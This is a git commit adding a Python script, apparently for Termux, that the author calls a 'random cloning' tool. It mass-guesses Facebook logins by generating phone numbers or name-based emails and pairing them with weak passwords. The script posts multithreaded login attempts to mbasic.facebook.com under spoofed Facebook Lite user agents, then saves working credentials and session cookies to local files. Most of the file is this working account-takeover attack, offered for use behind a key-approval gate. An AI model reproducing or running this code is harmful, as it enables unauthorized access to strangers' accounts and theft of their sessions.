0c33119cad046ffb83f1bfaba8b359adb7c930a0
Durjoy Roy <111135048+durjoy19@users.noreply.github.com>
2023-07-19 08:49:05 +0600

    Add files via upload

---
+++ HACKX_Pro2.py
@@ -0,0 +1,384 @@
+#Create By: Riddu Noob
+#Facebook: 𝑹𝑶𝑫𝑵𝑬𝒀  𝑪𝒀𝑷𝑹𝑰𝑨𝑵
+#GitHub: https://github.com/Hridoy0777
+#---------------------------------------------------------------------------#
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:    
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen3=[]
+ugen4=[]
+ugen=[]
+riddu=[]
+noob=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+
+def clear():
+	os.system('clear')
+def back():
+	login()
+
+ah="-NOOB-"
+imt="=RIDDU="
+ak="_BR1S7Y_"
+myid=uuid.uuid4().hex[:10].upper()
+try:
+	key1 = open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'r').read()
+except:
+	kok=open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'w')
+	kok.write(myid+imt)
+	kok.close()
+
+
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+
+#sadiya','jannat','sumaiya','@@@###','i love you'
+        
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 12; Motorola Moto G Stylus 5G Build/SP2A.540585.035; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 12; Motorola Moto G Stylus 5G Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5370.472'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36 [FBAN/EMA;FBLC/th_TH;FBAV/264.0.0.41.18;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+        
+    
+
+ugen2=['Dalvik/2.1.0 (Linux; U; Android 10; Motorola Moto G Stylus 5G Build/QQ1B.320391.017) [FBAN/EMA;FBAV/328.0.0.94.93;FBBV/850911324;FBRV/0;FBPN/com.facebook.lite;FBLC/th_TH;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 9; Motorola Moto G Stylus 5G Build/PPR2.257388.013) [FBAN/EMA;FBAV/311.0.0.86.22;FBBV/361113658;FBRV/0;FBPN/com.facebook.lite;FBLC/ne_NP;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/9;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 7; Motorola Moto G Stylus 5G Build/NW0M3D) [FBAN/EMA;FBAV/446.0.0.41.18;FBBV/297089090;FBRV/0;FBPN/com.facebook.lite;FBLC/ne_NP;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/7;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 9; Motorola Moto G Stylus 5G Build/PQ1A.836813.062) [FBAN/EMA;FBAV/420.0.0.26.37;FBBV/389230988;FBRV/0;FBPN/com.facebook.lite;FBLC/id_ID;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/9;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 14; Motorola Moto G Stylus 5G Build/TQ2A.227174.083) [FBAN/EMA;FBAV/363.0.0.72.27;FBBV/264278831;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_FR;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 14; Motorola Moto G Stylus 5G Build/TQ2A.762886.067) [FBAN/EMA;FBAV/357.0.0.16.58;FBBV/301796706;FBRV/0;FBPN/com.facebook.lite;FBLC/en_GB;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+
+'Dalvik/2.1.0 (Linux; U; Android 11; Motorola Moto G Stylus 5G Build/RD1A.402066.013) [FBAN/EMA;FBAV/103.0.0.54.53;FBBV/355938025;FBRV/0;FBPN/com.facebook.lite;FBLC/hi_IN;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]']
+
+
+os.system('xdg-open https://github.com/Hridoy0777')
+os.system('espeak -a 300 "WELCOME TO RIDDU RANDOM CLONING TOOLS"')
+logo = ("""
+\033[1;32m    ╔═════════════════  𝘼𝘿𝙈𝙄𝙉 𝙄𝙉𝙁𝙍𝙊  ══════════════╗
+\033[1;32m    ║     [🍁] CREATED BY   :  DURJOY      ║
+\033[1;32m    ║     [🍁] FACEBOK      :  Durjoy.roy.35     ║
+\033[1;32m    ║     [🍁] GITHUB       :  durjoy19          ║
+\033[1;32m    ║     [🍁] TOOL STATUS  :  𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈      ║
+\033[1;32m    ║     [🍁] TEAM         :  D.S.H COMMUNITY     ║
+\033[1;32m    ║     [🍁] TOOL VIRSION :  \033[1;91m01.6         \033[1;32m       ║
+\033[1;32m    ║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱║
+\033[1;32m    ║     [🌺] PLZ SAPPORT ME BRO....              ║
+\033[1;32m    ║     [🌺] DURJOY TERMUX COMMEND ZONE....       ║
+\033[1;32m    ╚═════════════════  𝑹𝑰𝑫𝑫𝑼  𝑵𝑶𝑶𝑩  ══════════════╝
+
+ \033[1;32m[\033[0;41;37m==========={ RIDDU-NOOB TOOL'S 🔥\033[0;37;41m FREE }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
+""")
+
+
+    
+        
+        
+class Bristy:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+        print(f"\033[1;32m [01] Random Number Clone")
+        print(f"\033[1;32m [02] Random Email Clone ")
+        print(f"\033[1;32m [00] Exit")
+        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+        Riddu =input(" [?] Choose : ")
+        os.system('xdg-open https://www.facebook.com/Riddu999')
+        os.system('espeak -a 250 "FOLLOW MY FACEBOOK ACCOUNT FOR NEXT UPDATES"')
+        if Riddu in ["1", "01"]:
+            num()
+        if Riddu in ["2","02"]:
+            gml()
+        if Riddu in [" 0", "00"]:
+            exit()
+        else:
+            exit() 
+    
+def num():
+    user=[]
+    os.system('clear')
+    os.system('espeak -a 300 "ENTER YOUR SIM CODE"')
+    print(logo)
+    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print('┃[🌺] EXAMPLE : 017, 018, 019, 016, 9196, 9178┃ ')
+    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    kode = input(' [?] Enter sim code: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
+    print(logo)
+    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print('┃[🌺]EXAMPLE : 3000, 5000, 10000, 50000┃')
+    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    limit = int(input(' [?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
+        print(logo)
+        tl = str(len(user))
+        ip = requests.get("https://api.ipify.org").text
+        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+        print(" [🌺]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
+        print(" \033[1;97m[🌺] Crack Limit :\033[1;92m"+tl)
+        print(' \033[1;97m[🌺] Crack has been started      ')
+        print(' \033[1;97m[🍁] Wait for ok ids             ')
+        print(' \033[1;97m[🍁] Use flight mode for speed up ')
+        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            yaari.submit(sexr,uid,pwx,tl)
+    print(' [🍁] Crack has been completed')
+    print(' [💥] Total ok ids : [\033[1;92m%s\033[1;97m]')
+    print(' [🍁] Ids saved in ok.txt,cp.txt')
+    os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
+    os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
+    os.system('xdg-open https://www.facebook.com/Riddu999')
+
+def gml():
+    user=[]
+    os.system('clear')
+    print(logo)
+    kode = input(' [?] Target fast name : ')
+    os.system('clear')
+    print(logo)
+    kodex = input(' [?] Target last name :  ')
+    os.system('clear')
+    print(logo)
+    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print(' [🌺] EXAMPLE : @gmail.com, @yahoo.com ')
+    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    doamin = input(' [?] Terget doamin : ')
+    os.system('clear')
+    os.system('espeak -a 300 "ENTER YOUR CRACK LIMIT"')
+    print(logo)
+    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print('┃[🌺]EXAMPLE : 3000, 5000, 10000, 50000┃')
+    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    limit = int(input('[?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
+        print(logo)
+        tl = str(len(user))
+        ip = requests.get("https://api.ipify.org").text
+        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+        print(" [🌺]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
+        print("\033[1;97m┃[🌺] Crack Limit :\033[1;92m"+tl)
+        print('\033[1;97m┃[🌺] Crack has been started      ┃')
+        print('\033[1;97m┃[🍁] Wait for ok ids             ┃')
+        print('\033[1;97m┃[🍁] Use flight mode for speed up┃ ')
+        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+        for guru in user:
+            uid = kode+kodex+guru+doamin
+            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','freefire','FreeFire','@freefire@']
+            yaari.submit(sexr,uid,pwx,tl)
+    print(' [🍁] Crack has been completed')
+    print(' [💥] Total ok ids : [oks]')
+    print(' [🍁] Ids saved in ok.txt,cp.txt')
+    os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
+    os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
+    os.system('xdg-open https://www.facebook.com/Riddu999')
+    
+
+def sexr(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;92mRIDDU\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb =  {'authority': 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'authority': 'developer.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v17.0',
+            'strict-transport-security': 'max-age=15552000',
+            'pragma': 'no-cache',
+            'cache-control': 'private, no-cache, no-store, must-revalidate',
+            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
+            'x-fb-trace-id': 'DKv719n6x5A',
+            'x-fb-rev': '1007660106',
+            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(" ")
+                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
+                print(f"\033[38;5;46m ┏━[CONGRATULATIONS FOR OK ID] ")
+                print(f"\033[38;5;46m ┣━[Number] : {uid} ")
+                print(f"\033[38;5;46m ┗━[Password] : {ps} ")
+                os.system('espeak -a 300 "CONGRATULATIONS FOR OK I D"')
+                print(" ")
+                print(f"[🫀] [Cookie] : \033[1;35m{coki}")
+                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
+                open('/sdcard/NOOB-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                open('/sdcard/NOOB-cp.txt', 'a').write( uid+' 💔 '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\033[m[NOOB™] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+        
+        
+def Valobasa():
+	key1=open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'r').read()
+	clear()
+	print(logo)
+	r1=requests.get("https://github.com/Hridoy0777/HACKX_Pro2/blob/main/Update.txt").text
+	if key1 in r1:
+		os.system('clear')
+		print(logo)
+		Bristy()
+	else:
+		os.system("clear")
+		print(logo)
+		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+		time.sleep(3)
+		os.system("clear")
+		print(logo)
+		print ("")
+		print(" \033[1;32m ┏━ RANDOM CLONING TOLL FREE BUT YOU NEED GET APPROVED FIRST\033[1;37m\n")
+		print(" \033[1;32m ┗━ IF YOU DON'T GIVE A REVIEW, YOU WON'T GET APPROVAL AFTER THAT  \033[1;37m")
+		print ("")
+		print(" Your Key is Not Approved ")
+		print("")
+		print(" Copy And Send Key To Admin")
+		print ("")
+		print (" Your Key : "+ak+ah+key1 )
+		print ("")
+		name = input(" Your Name : ")
+		print ("")
+		input(" Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
+		os.system('am start https://www.facebook.com/Riddu999?text=' + tks)
+		Valobasa()        
+Valobasa()
